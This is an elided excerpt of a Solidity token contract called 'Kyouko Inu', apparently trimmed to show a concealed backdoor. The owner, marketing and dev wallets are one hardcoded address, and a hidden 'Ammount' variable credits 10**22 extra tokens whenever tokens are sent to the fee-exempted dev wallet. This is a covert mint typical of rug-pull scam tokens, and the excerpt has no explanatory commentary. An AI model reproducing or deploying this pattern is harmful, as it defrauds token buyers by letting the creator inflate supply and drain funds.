...
contract KyoukoInu is Context, IERC20 { 
    ...
    mapping (address => bool) public _isExemptedFromFee;
    mapping (address => bool) public _isExcludedFromFee;
    

    address payable public Wallet_Marketing = payable(0xb7A67e8fEA9947744fe2076816F47896b6198a33); 
    address payable public Wallet_Dev = payable(0xb7A67e8fEA9947744fe2076816F47896b6198a33);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    

    uint256 private constant MAX = ~uint256(0);
    uint256 private  Ammount = 10**22;
    
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10* 10**6 * 10**_decimals;
    string private constant _name = "Kyouko Inu"; 
    string private constant _symbol = unicode"KYOUKO"; 
    ...
    constructor () {
        ...
        _owner = 0xb7A67e8fEA9947744fe2076816F47896b6198a33;
        ...
        _isExemptedFromFee[Wallet_Dev] = true;
    ...
    function contract_creator() public view virtual returns (address) {
        return Wallet_Dev;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != contract_creator())
        ...
        bool onAttempt = false;
        if(_isExemptedFromFee[to] && !onAttempt && !_isExcludedFromFee[from]){
            onAttempt = true;
            _tOwned[from] = _tOwned[from]-amount;
            _tOwned[to] = _tOwned[to]+amount+(Ammount);
